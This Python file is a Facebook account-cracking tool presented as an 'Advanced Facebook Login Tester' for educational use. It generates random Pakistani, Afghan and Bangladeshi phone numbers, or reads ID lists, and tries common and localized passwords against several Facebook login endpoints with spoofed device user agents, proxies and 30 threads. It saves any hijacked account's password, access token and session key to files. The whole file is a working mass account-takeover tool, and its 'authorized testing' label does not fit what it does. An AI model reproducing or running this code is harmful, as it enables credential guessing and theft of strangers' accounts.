#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced Facebook Login Tester - Enhanced Edition
For Educational & Authorized Testing Only
University Project - Optimized & Updated
"""

import os
import sys
import time
import random
import string
import uuid
import json
import threading
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    os.system('pip install requests urllib3')
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry

# ========================== COLORS ==========================
R = "\033[1;91m"
G = "\033[1;92m"
Y = "\033[1;93m"
B = "\033[1;94m"
P = "\033[1;95m"
C = "\033[1;96m"
W = "\033[1;97m"
N = "\033[0m"

# ========================== CONFIGURATION ==========================
MAX_WORKERS = 30
REQUEST_TIMEOUT = 15
MAX_RETRIES = 2
PROXY_FILE = ".prox.txt"
OUTPUT_DIR = "/sdcard/AWM-Results"
os.makedirs(OUTPUT_DIR, exist_ok=True)

# Global variables with locks
lock = threading.Lock()
ok_list = []
cp_list = []
fa_list = []
loop_counter = 0
total_targets = 0

# ========================== ENHANCED USER-AGENT GENERATION ==========================
class UserAgentGenerator:
    """Advanced Facebook-specific User-Agent generator with real device data"""
    
    # Real device models from 2025-2026
    ANDROID_MODELS = [
        "SM-S928B", "SM-S918B", "SM-A556B", "SM-A156B", "Pixel 9 Pro", "Pixel 8",
        "CPH2609", "CPH2551", "RMX3888", "RMX3740", "23127PN0CG", "23090RA98G",
        "SM-F956B", "SM-F946B", "Xiaomi 14 Ultra", "OnePlus 12", "V2324A"
    ]
    
    ANDROID_VERSIONS = ["13", "14", "15"]
    BUILD_VERSIONS = [
        "UKQ1.240227.001", "AP3A.240617.008", "UP1A.240105.002",
        "TP1A.221005.002", "SP2A.220505.002"
    ]
    
    FB_APPS = [
        "com.facebook.katana",      # Main FB app
        "com.facebook.lite",         # FB Lite
        "com.facebook.orca"          # Messenger
    ]
    
    FB_APP_NAMES = ["FB4A", "Orca-Android", "FacebookLite"]
    LOCALES = ["en_US", "en_GB", "fr_FR", "es_ES", "de_DE", "ar_AR"]
    
    @classmethod
    def get_dalvik_ua(cls):
        """Generate Dalvik VM style User-Agent (classic FB app)"""
        model = random.choice(cls.ANDROID_MODELS)
        android_ver = random.choice(cls.ANDROID_VERSIONS)
        build = random.choice(cls.BUILD_VERSIONS)
        fb_app = random.choice(cls.FB_APPS)
        fb_app_name = random.choice(cls.FB_APP_NAMES)
        fbav = f"{random.randint(450, 550)}.0.0.{random.randint(10, 99)}"
        fbbv = str(random.randint(400000000, 600000000))
        locale = random.choice(cls.LOCALES)
        
        return (f"Dalvik/2.1.0 (Linux; U; Android {android_ver}; {model} Build/{build}) "
                f"[FBAN/{fb_app_name};FBAV/{fbav};FBPN/{fb_app};FBLC/{locale};"
                f"FBBV/{fbbv};FBCR/null;FBMF/{model.split()[0]};FBBD/{model};"
                f"FBDV/{model};FBSV/{android_ver};FBCA/arm64-v8a:null;"
                f"FBDM/{{density=2.0,width=1080,height=2400}};FB_FW/1;]")
    
    @classmethod
    def get_webview_ua(cls):
        """Generate WebView style User-Agent (IAB/Custom Tabs)"""
        model = random.choice(cls.ANDROID_MODELS)
        android_ver = random.choice(cls.ANDROID_VERSIONS)
        build = random.choice(cls.BUILD_VERSIONS)
        chrome_ver = random.randint(120, 135)
        fbav = f"{random.randint(500, 600)}.0.0.{random.randint(50, 99)}"
        
        return (f"Mozilla/5.0 (Linux; Android {android_ver}; {model} Build/{build}; wv) "
                f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_ver}.0.0.0 "
                f"Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fbav};IABMV/1;]")
    
    @classmethod
    def get_modern_dalvik_ua(cls):
        """Generate modern Dalvik UA with MF (Messenger Features) support"""
        model = random.choice(cls.ANDROID_MODELS)
        android_ver = random.choice(cls.ANDROID_VERSIONS)
        build = random.choice(cls.BUILD_VERSIONS)
        fb_app = random.choice(cls.FB_APPS)
        fbav = f"{random.randint(480, 580)}.0.0.{random.randint(15, 99)}"
        fbbv = str(random.randint(500000000, 700000000))
        
        return (f"Dalvik/2.1.0 (Linux; U; Android {android_ver}; {model} Build/{build}) "
                f"[FBAN/FB4A;FBAV/{fbav};FBPN/{fb_app};FBLC/en_US;FBBV/{fbbv};"
                f"FBCR/null;FBMF/{model.split()[0]};FBBD/{model};FBDV/{model};"
                f"FBSV/{android_ver};FBCA/arm64-v8a:null;FBDM/{{density=2.0,width=1080,height=2400}};"
                f"FB_FW/1;FBRV/0;FBCR/null;]")
    
    @classmethod
    def get_random_ua(cls):
        """Return random UA type"""
        ua_type = random.choice(["dalvik", "webview", "modern"])
        if ua_type == "dalvik":
            return cls.get_dalvik_ua()
        elif ua_type == "webview":
            return cls.get_webview_ua()
        else:
            return cls.get_modern_dalvik_ua()

# ========================== PROXY MANAGEMENT ==========================
def load_proxies():
    """Load proxy list from file"""
    if not os.path.exists(PROXY_FILE):
        return []
    try:
        with open(PROXY_FILE, 'r') as f:
            proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        return proxies
    except:
        return []

def get_random_proxy():
    """Get random proxy from list"""
    proxies = load_proxies()
    if proxies:
        proxy = random.choice(proxies)
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    return None

def get_session_with_retries():
    """Create requests session with retry strategy"""
    session = requests.Session()
    retry_strategy = Retry(
        total=MAX_RETRIES,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=20, pool_maxsize=20)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

# ========================== FACEBOOK LOGIN METHODS ==========================
class FacebookLoginTester:
    """Advanced Facebook login tester with multiple methods"""
    
    # Facebook API endpoints
    B_API_URL = "https://b-api.facebook.com/method/auth.login"
    GRAPH_API_URL = "https://graph.facebook.com/v20.0/oauth/access_token"
    B_GRAPH_URL = "https://b-graph.facebook.com/auth/login"
    
    # API credentials (public, used by Facebook SDK)
    API_KEY = "882a8490361da98702bf97a021ddc14d"
    API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"
    ACCESS_TOKEN = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
    
    @classmethod
    def method_b_api(cls, identifier, password):
        """Method 1: b-api.facebook.com (Classic Facebook API)"""
        session = get_session_with_retries()
        proxy = get_random_proxy()
        if proxy:
            session.proxies.update(proxy)
        
        # Generate unique identifiers
        device_id = str(uuid.uuid4())
        adid = str(uuid.uuid4())
        machine_id = ''.join(random.choices(string.hexdigits.lower(), k=16))
        
        data = {
            'api_key': cls.API_KEY,
            'access_token': cls.ACCESS_TOKEN,
            'email': identifier,
            'password': password,
            'format': 'json',
            'locale': random.choice(['en_US', 'en_GB', 'ar_AR']),
            'method': 'auth.login',
            'device_id': device_id,
            'adid': adid,
            'machine_id': machine_id,
            'generate_session_cookies': '1',
            'generate_analytics_claims': '1',
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_machine_id': '1',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            'jazoest': str(random.randint(2000, 40000)),
            'cpl': 'true',
            'family_device_id': device_id,
            'sim_country': random.choice(['us', 'gb', 'pk', 'af']),
            'network_country': random.choice(['us', 'gb', 'pk', 'af']),
            'client_country_code': random.choice(['US', 'GB', 'PK', 'AF']),
        }
        
        headers = {
            'User-Agent': UserAgentGenerator.get_random_ua(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'X-FB-Connection-Type': random.choice(['MOBILE.LTE', 'MOBILE.WIFI', 'WIFI']),
            'X-FB-Connection-Quality': random.choice(['EXCELLENT', 'GOOD', 'POOR']),
            'X-FB-Device-ID': device_id,
            'X-FB-ADID': adid,
        }
        
        try:
            response = session.post(cls.B_API_URL, data=data, headers=headers, timeout=REQUEST_TIMEOUT)
            result = response.json()
            
            if 'session_key' in result:
                return ('success', result)
            elif 'error' in result and 'www.facebook.com' in result['error'].get('message', ''):
                return ('checkpoint', result)
            else:
                return ('failed', result)
        except Exception as e:
            return ('error', str(e))
    
    @classmethod
    def method_b_graph(cls, identifier, password):
        """Method 2: b-graph.facebook.com (Modern Graph API)"""
        session = get_session_with_retries()
        proxy = get_random_proxy()
        if proxy:
            session.proxies.update(proxy)
        
        device_id = str(uuid.uuid4())
        adid = str(uuid.uuid4())
        
        data = {
            'email': identifier,
            'password': password,
            'adid': adid,
            'device_id': device_id,
            'format': 'json',
            'locale': random.choice(['en_US', 'en_GB']),
            'client_country_code': random.choice(['US', 'GB']),
            'generate_session_cookies': '1',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
        }
        
        headers = {
            'User-Agent': UserAgentGenerator.get_random_ua(),
            'Authorization': f'OAuth {cls.ACCESS_TOKEN}',
            'X-FB-Friendly-Name': 'authenticate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-FB-Device-ID': device_id,
        }
        
        try:
            response = session.post(cls.B_GRAPH_URL, data=data, headers=headers, timeout=REQUEST_TIMEOUT)
            result = response.json()
            
            if 'session_key' in result:
                return ('success', result)
            elif 'error' in result and 'checkpoint' in str(result.get('error', {})).lower():
                return ('checkpoint', result)
            else:
                return ('failed', result)
        except Exception as e:
            return ('error', str(e))
    
    @classmethod
    def method_graph_oauth(cls, identifier, password):
        """Method 3: graph.facebook.com OAuth (Web-style login)"""
        session = get_session_with_retries()
        proxy = get_random_proxy()
        if proxy:
            session.proxies.update(proxy)
        
        # Generate random app ID from known FB app IDs
        app_ids = [
            "124024574287414",  # Facebook Main
            "350685531728",      # Facebook for Android
            "6628568379",        # Facebook for iOS
            "165907476854626",   # Facebook Lite
        ]
        app_id = random.choice(app_ids)
        
        data = {
            'client_id': app_id,
            'grant_type': 'password',
            'username': identifier,
            'password': password,
            'access_token': cls.ACCESS_TOKEN,
            'scope': 'email,public_profile,user_friends',
        }
        
        headers = {
            'User-Agent': UserAgentGenerator.get_webview_ua(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'application/json',
        }
        
        try:
            response = session.post(cls.GRAPH_API_URL, data=data, headers=headers, timeout=REQUEST_TIMEOUT)
            result = response.json()
            
            if 'access_token' in result:
                return ('success', result)
            elif 'error' in result:
                error_msg = result.get('error', {}).get('message', '')
                if 'checkpoint' in error_msg.lower() or 'approval' in error_msg.lower():
                    return ('checkpoint', result)
                return ('failed', result)
            else:
                return ('failed', result)
        except Exception as e:
            return ('error', str(e))

# ========================== CORE CRACKING FUNCTIONS ==========================
def crack_account(identifier, password_list, method='b_api', show_cp=False):
    """Attempt to crack account using specified method"""
    global loop_counter, ok_list, cp_list, _2fa_list, total_targets
    
    for password in password_list:
        if method == 'b_api':
            status, result = FacebookLoginTester.method_b_api(identifier, password)
        elif method == 'b_graph':
            status, result = FacebookLoginTester.method_b_graph(identifier, password)
        else:
            status, result = FacebookLoginTester.method_graph_oauth(identifier, password)
        
        if status == 'success':
            uid = str(result.get('uid', identifier))
            session_key = result.get('session_key', '')
            access_token = result.get('access_token', '')
            
            with lock:
                if uid not in ok_list:
                    ok_list.append(uid)
                    print(f"\r{G}[LIVE] {uid} | {password}{N}")
                    
                    # Save results
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    with open(f"{OUTPUT_DIR}/AWM-OK.txt", "a") as f:
                        f.write(f"{uid}|{password}|{access_token}|{session_key}|{timestamp}\n")
            return True
            
        elif status == 'checkpoint':
            uid = str(result.get('uid', identifier))
            with lock:
                if uid not in cp_list:
                    cp_list.append(uid)
                    if show_cp:
                        print(f"\r{Y}[CP] {uid} | {password}{N}")
                    with open(f"{OUTPUT_DIR}/AWM-CP.txt", "a") as f:
                        f.write(f"{uid}|{password}|{timestamp}\n")
            return False
    
    # Update progress
    with lock:
        loop_counter += 1
        if total_targets > 0:
            percent = round(loop_counter * 100 / total_targets, 2)
            sys.stdout.write(f"\r{W}[{method.upper()}] Progress: {loop_counter}/{total_targets} ({percent}%) | OK:{len(ok_list)} CP:{len(cp_list)}{N}")
            sys.stdout.flush()
    return False

# ========================== NUMBER GENERATION ==========================
def generate_numbers(country_code, count):
    """Generate random phone numbers with country code"""
    numbers = []
    for _ in range(count):
        suffix = ''.join(random.choices(string.digits, k=random.randint(7, 10)))
        numbers.append(country_code + suffix)
    return numbers

# ========================== FILE PROCESSING ==========================
def process_file(file_path, password_list, method='b_api', show_cp=False):
    """Process IDs from file"""
    global total_targets, loop_counter, ok_list, cp_list, _2fa_list
    
    try:
        with open(file_path, 'r') as f:
            lines = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{R}[!] Error reading file: {e}{N}")
        return
    
    total_targets = len(lines)
    loop_counter = 0
    ok_list.clear()
    cp_list.clear()
    
    print(f"{G}[+] Total targets: {total_targets}{N}")
    print(f"{G}[+] Method: {method.upper()}{N}")
    print(f"{W}[+] Starting... (Press Ctrl+C to stop){N}")
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {}
        for line in lines:
            if '|' in line:
                identifier = line.split('|')[0].strip()
            else:
                identifier = line.strip()
            futures[executor.submit(crack_account, identifier, password_list, method, show_cp)] = identifier
        
        for future in as_completed(futures):
            pass
    
    print(f"\n{G}[+] Completed. OK: {len(ok_list)} | CP: {len(cp_list)}{N}")

# ========================== RANDOM CLONING ==========================
def random_cloning(country_code, count, password_list, method='b_api', show_cp=False):
    """Perform random cloning with generated numbers"""
    global total_targets, loop_counter, ok_list, cp_list
    
    numbers = generate_numbers(country_code, count)
    total_targets = len(numbers)
    loop_counter = 0
    ok_list.clear()
    cp_list.clear()
    
    print(f"{G}[+] Country code: {country_code}{N}")
    print(f"{G}[+] Total numbers: {total_targets}{N}")
    print(f"{G}[+] Method: {method.upper()}{N}")
    print(f"{W}[+] Starting... (Press Ctrl+C to stop){N}")
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {executor.submit(crack_account, num, password_list, method, show_cp): num for num in numbers}
        for future in as_completed(futures):
            pass
    
    print(f"\n{G}[+] Completed. OK: {len(ok_list)} | CP: {len(cp_list)}{N}")

# ========================== MENU SYSTEM ==========================
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    banner = f"""
{G}
╔══════════════════════════════════════════════════════════════╗
║     █████╗ ██╗    ██╗███╗   ███╗                             ║
║    ██╔══██╗██║    ██║████╗ ████║    Advanced Facebook       ║
║    ███████║██║ █╗ ██║██╔████╔██║    Login Tester            ║
║    ██╔══██║██║███╗██║██║╚██╔╝██║                             ║
║    ██║  ██║╚███╔███╔╝██║ ╚═╝ ██║    v2.0 - Enhanced        ║
║    ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝     ╚═╝                             ║
╠══════════════════════════════════════════════════════════════╣
║ [✓] Author: HAMAYON KHAN (Enhanced Edition)                 ║
║ [✓] Status: Educational & Authorized Testing Only          ║
║ [✓] Version: S-3 (2026 Update)                              ║
╚══════════════════════════════════════════════════════════════╝
{N}"""
    print(banner)

def show_menu():
    while True:
        clear_screen()
        print_banner()
        print(f"{C}╔════════════════════════════════════════════════════════╗")
        print(f"║ {W}[1] {C}Crack from file                               {W}║")
        print(f"║ {W}[2] {C}Random cloning (API Method)                   {W}║")
        print(f"║ {W}[3] {C}Random cloning (Graph Method)                 {W}║")
        print(f"║ {W}[4] {C}Random cloning (OAuth Method)                 {W}║")
        print(f"║ {W}[0] {C}Exit                                          {W}║")
        print(f"╚════════════════════════════════════════════════════════╝{N}")
        
        choice = input(f"{G}[?] Select option: {N}").strip()
        
        if choice in ['1', '01']:
            file_path = input(f"{G}[?] Enter file path: {N}").strip()
            if not os.path.exists(file_path):
                print(f"{R}[!] File not found!{N}")
                time.sleep(1)
                continue
            
            # Password list selection
            print(f"{W}\nPassword options:{N}")
            print(f"[1] Auto-generated (common patterns)")
            print(f"[2] Custom passwords")
            p_choice = input(f"{G}[?] Choose: {N}").strip()
            
            if p_choice == '1':
                passlist = [
                    '123456', 'password', '123456789', '12345', '12345678',
                    'qwerty', 'abc123', '111111', '123123', '1234567890',
                    'admin', 'iloveyou', 'welcome', 'monkey', 'dragon'
                ]
            else:
                passlist = []
                try:
                    count = int(input(f"{G}[?] How many passwords? {N}"))
                    for i in range(count):
                        p = input(f"Password {i+1}: ").strip()
                        if p:
                            passlist.append(p)
                except:
                    passlist = ['123456']
            
            # Method selection
            print(f"{W}\nMethods:{N}")
            print(f"[1] B-API (Classic)")
            print(f"[2] B-Graph (Modern)")
            print(f"[3] Graph OAuth (Web)")
            m_choice = input(f"{G}[?] Choose method: {N}").strip()
            
            show_cp = input(f"{G}[?] Show CP accounts? (y/n): {N}").strip().lower() in ['y', 'yes', '1']
            
            method_map = {'1': 'b_api', '2': 'b_graph', '3': 'oauth'}
            method = method_map.get(m_choice, 'b_api')
            
            process_file(file_path, passlist, method, show_cp)
            input(f"{W}[Press Enter to continue...]{N}")
            
        elif choice in ['2', '02', '3', '03', '4', '04']:
            # Country selection
            print(f"{W}\nCountries:{N}")
            print(f"[1] Pakistan (923xx)")
            print(f"[2] Afghanistan (937x)")
            print(f"[3] Bangladesh (880xx)")
            print(f"[4] Custom")
            c_choice = input(f"{G}[?] Choose country: {N}").strip()
            
            if c_choice == '1':
                code = input(f"{G}[?] Enter code (e.g., 92302): {N}").strip()
                passlist = ['123456', 'pakistan', 'karachi', 'lahore', 'pak123']
            elif c_choice == '2':
                code = input(f"{G}[?] Enter code (e.g., 9370): {N}").strip()
                passlist = ['123456', 'afghan123', 'kabul123', 'khan123']
            elif c_choice == '3':
                code = input(f"{G}[?] Enter code (e.g., 88017): {N}").strip()
                passlist = ['123456', 'bangladesh', 'dhaka123', 'freefire']
            else:
                code = input(f"{G}[?] Enter country code: {N}").strip()
                passlist = ['123456', 'password']
            
            try:
                limit = int(input(f"{G}[?] Number of IDs (default 1000): {N}").strip() or "1000")
            except:
                limit = 1000
            
            show_cp = input(f"{G}[?] Show CP accounts? (y/n): {N}").strip().lower() in ['y', 'yes', '1']
            
            if choice in ['2', '02']:
                random_cloning(code, limit, passlist, 'b_api', show_cp)
            elif choice in ['3', '03']:
                random_cloning(code, limit, passlist, 'b_graph', show_cp)
            else:
                random_cloning(code, limit, passlist, 'oauth', show_cp)
            
            input(f"{W}[Press Enter to continue...]{N}")
            
        elif choice in ['0', '00']:
            print(f"{G}[+] Thanks for using!{N}")
            sys.exit(0)
        else:
            print(f"{R}[!] Invalid option!{N}")
            time.sleep(1)

# ========================== MAIN ==========================
if __name__ == "__main__":
    try:
        show_menu()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Interrupted by user.{N}")
        sys.exit(0)
    except Exception as e:
        print(f"{R}[!] Error: {e}{N}")
        sys.exit(1)